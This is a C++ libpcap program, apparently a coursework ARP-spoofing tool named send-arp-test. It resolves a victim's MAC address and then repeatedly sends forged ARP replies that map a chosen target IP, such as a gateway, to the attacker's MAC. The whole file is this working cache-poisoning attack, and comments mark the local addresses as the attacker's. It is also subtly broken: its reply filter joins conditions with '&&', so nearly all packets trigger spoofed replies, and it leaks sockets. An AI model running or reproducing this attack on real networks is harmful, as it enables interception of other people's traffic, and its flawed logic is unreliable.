#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>


void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test eth0 192.168.0.101 192.168.0.1\n");
}


uint8_t my_mac[Mac::SIZE];

// Attacker MAC Address
void my_MAC(char *dev)
{
    struct ifreq ifr;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(ifr.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr)) {
        memcpy(&my_mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
    }
    else {
        printf("[MAC Error] \n");
        exit(0);
    }
}

// Attacker IP Address
char* my_IP(char *dev)
{
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    static char my_ip[20];
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    if(ioctl(fd, SIOCGIFADDR, &ifr)<0){
        printf("[IP Error] \n");
        exit(0);
    }
    else{
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, my_ip, sizeof(struct sockaddr));
        return my_ip;
    }
    close(fd);
}


#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)


int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }


    char *send_IP = argv[2]; // argv[2] => sender ip
    char *target_IP = argv[3];  // argv[3] => target ip

    my_MAC(dev);
    my_IP(dev);

    // ARP Request
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // broadcast
    packet.eth_.smac_ = Mac(my_mac); // my_MAC
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac); // my_MAC
    packet.arp_.sip_ = htonl(Ip(my_IP(dev))); // my_IP
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // broadcast
    packet.arp_.tip_ = htonl(Ip(send_IP)); // you_IP => argv[2]


    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "[pcap_sendpacket => %d / error => %s]\n", res, pcap_geterr(handle));
    }

    while(true) {
            struct pcap_pkthdr* header;
            const u_char* reply_packet;
            int res = pcap_next_ex(handle, &header, &reply_packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("[pcap_next_ex => %d(%s)]\n", res, pcap_geterr(handle));
                break;
            }


            //ARP Reply
            struct EthArpPacket *etharp = (struct EthArpPacket *)reply_packet;
            if(etharp->eth_.type_!=htons(EthHdr::Arp)
                    && etharp->arp_.op_!=htons(ArpHdr::Reply)
                    && etharp->arp_.sip_!=htonl(Ip(send_IP))) continue;
            printf("[Catch MAC]\n");

            packet.eth_.dmac_ = etharp->eth_.smac_;
            packet.arp_.tmac_ = etharp->arp_.smac_;
            packet.arp_.op_=htons(ArpHdr::Reply);
            packet.arp_.sip_=htonl(Ip(target_IP));


            int repacket = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
            if (repacket != 0) {
                fprintf(stderr, "[pcap_sendpacket => %d / error => %s]\n", res, pcap_geterr(handle));
            }

    }
    pcap_close(handle);
}
